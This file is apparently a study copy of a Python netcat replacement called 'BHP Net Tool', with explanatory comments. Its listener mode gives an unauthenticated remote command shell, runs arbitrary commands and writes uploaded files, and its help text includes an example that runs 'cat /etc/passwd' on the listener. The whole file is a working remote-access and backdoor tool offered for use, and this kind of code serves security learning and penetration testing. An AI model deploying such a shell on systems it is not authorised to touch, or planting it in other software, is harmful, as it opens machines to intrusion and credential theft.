import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # check_output runs a command on the local OS and returns output
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    # Initialize NetCat object with objects from command line and buffer
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # Create socket object
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Entry point for managing NetCat object
    # Delegates execution to two methods; listener and send
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        # Connects to target and port
        self.socket.connect((self.args.target, self.args.port))
        # Send buffer to target first
        if self.buffer:
            self.socket.send(self.buffer)
        # Try/catch block to be able to manually close connection with CTRL-C
        try:
            # Loop to receive data from target
            # Breaks out of loop if no more data
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                # Print response data and pause to get interactive input
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    # Send the input
                    self.socket.send(buffer.encode())
        # Loop continues until CTRL-C to close socket
        except KeyboardInterrupt:
            print('User terminated')
            self.socket.close()
            sys.exit()

    def listen(self):
        # Binds to target and port
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # Listens in a loop
        while True:
            client_socket, _ = self.socket.accept()
            # Passes connected socket to handle method
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    # The handle method executes the task corresponding to the command line argument it receives:
    # Execute a command, upload a file, or start a shell
    def handle(self, client_socket):
        # If the command should be executed its passed to the execute function
        # The output is sent back on the socket
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # If a file is uploaded a loop is setup to listen for content on the listening socket
        # and receives data until there's no more data coming in
        # The accumulated content is written to the specified file
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        # If a shell is created, a loop is setup and sends a prompt to the sender
        # and waits for a command string to come back
        # The command is executed by using the execute function and return the output
        # of the command to the sender    
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    # argparse module creates CLI
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # Examples from --help command
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to server
        '''))
    # Arguments for program behavior
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    # For listener setup, invokes NetCat object with empty buffer string
    # Otherwise buffer content sent from stdin
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()